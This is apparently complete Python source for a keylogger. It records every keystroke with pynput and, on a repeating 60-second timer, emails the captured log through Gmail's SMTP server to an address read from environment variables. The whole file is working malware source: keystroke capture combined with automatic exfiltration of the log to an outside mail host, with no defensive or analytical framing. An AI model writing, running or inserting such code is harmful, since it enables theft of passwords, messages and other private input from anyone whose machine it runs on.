import threading
import smtplib
import os
from pynput import keyboard as kb
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from dotenv import load_dotenv


class Keylogger:
    def __init__(self):
        """🧠 Initializes the keylogger."""
        self.log = []
        self.time_count = 60 # ⏱️ Time interval (in seconds) between reports
        self.listener = kb.Listener(on_press=self.key_press)

        # 🔑 Mapping of special keys to actions or strings
        self.special_keys = {
            kb.Key.space: lambda: " ",
            kb.Key.backspace: lambda: "bk",
            kb.Key.tab: lambda: "\t",
            kb.Key.enter: lambda: "\n",
            kb.Key.esc: self.stop_listener
        }

    def configure(self):
        """⚙️ Loads environment variables from a .env file."""
        load_dotenv()

    def key_press(self, key):
        """⌨️ Handles key press events and logs characters."""
        try:
            # Regular keys (alphanumeric, symbols)
            self.log.append(key.char)
            print(key.char, end='', flush=True)
        except AttributeError:
            # Special keys (e.g., Enter, Backspace)
            action = self.special_keys.get(key)
            if action:
                result = action()
                if isinstance(result, str):
                    if result == "bk" and self.log:
                        self.log.pop()  # Simulate backspace
                        print('\b \b', end='', flush=True)
                    else:
                        self.log.append(result)
                        print(result, end='', flush=True)
      
    def report(self):
        """📤 Sends the captured keystrokes to the configured email address."""
        self.configure()

        # ✉️ Build the email message
        msg = MIMEMultipart("alternative")
        msg["From"] = os.getenv("FROM_EMAIL")
        msg["To"] = os.getenv("TO_EMAIL")
        msg["Subject"] = "Key Logs 📝"

        # 📄 Attach the log as plain text
        body = "".join(self.log)
        msg.attach(MIMEText(body, "plain"))

        # 📧 Send the email via SMTP
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(os.getenv("FROM_EMAIL"), os.getenv("APP_PASS"))
        server.sendmail(msg["From"], msg["To"], msg.as_string())
        server.quit()

        # 🔁 Schedule the next report
        self.timer = threading.Timer(self.time_count, self.report)
        self.timer.start()

    def start(self):
        """🚀 Starts the keylogger and begins listening for keystrokes."""
        print("[+] Starting keylogger. Press ESC to exit. 🎯")
        self.report()
        self.listener.start()
        self.listener.join()

    def stop_listener(self):
        """🛑 Stops the keylogger and cancels the reporting timer."""
        print("\n[+] ESC pressed. Stopping keylogger. 🛑")
        if hasattr(self, 'timer'):
            self.timer.cancel()
        self.listener.stop()
